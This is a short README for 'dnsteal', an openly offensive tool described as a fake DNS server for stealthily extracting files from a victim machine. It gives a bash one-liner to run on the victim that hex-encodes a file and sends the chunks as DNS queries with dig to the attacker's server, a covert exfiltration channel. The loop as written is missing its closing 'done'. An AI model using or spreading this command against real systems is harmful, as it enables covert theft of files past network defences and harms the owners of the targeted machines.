# dnsteal

This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. Below is an image showing an example of how to use:

![Alt text](https://github.com/m57/dnsteal/blob/master/dns-exfil.PNG)

On the victim machine, you simply can do something like so:

```bash
for b in $(xxd -p file/to/send.png); do dig @server $b.fakedomain.com
```

~x90
